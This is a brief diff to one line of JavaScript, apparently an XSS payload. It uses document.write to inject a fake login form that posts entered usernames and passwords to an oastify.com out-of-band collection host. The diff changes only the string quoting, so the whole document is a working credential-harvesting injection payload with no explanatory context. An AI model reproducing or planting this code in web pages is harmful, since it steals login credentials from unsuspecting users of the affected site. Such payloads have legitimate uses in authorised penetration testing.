@@ -1,8 +1,1 @@
-document.write('<div style="display:flex;justify-content:center;align-items:fl
-  ex-start;height:100vh;padding-top:100px;"><form                               
-  action="https://mf5ovj9hhtl250b6ayjctr0f268xwokd.oastify.com" method="post"   
-  style="text-align:center;"><input type="text" name="username"                 
-  placeholder="Username" style="display:block;margin:10px;padding:8px;"         
-  required><input type="password" name="password" placeholder="Password"
-  style="display:block;margin:10px;padding:8px;" required><button type="submit"
-  style="padding:8px 16px;">Login</button></form></div>');
+document.write(`<div style="display:flex;justify-content:center;align-items:flex-start;height:100vh;padding-top:100px;"><form action="https://mf5ovj9hhtl250b6ayjctr0f268xwokd.oastify.com" method="post" style="text-align:center;"><input type="text" name="username" placeholder="Username" style="display:block;margin:10px;padding:8px;" required><input type="password" name="password" placeholder="Password" style="display:block;margin:10px;padding:8px;" required><button type="submit" style="padding:8px 16px;">Login</button></form></div>`);
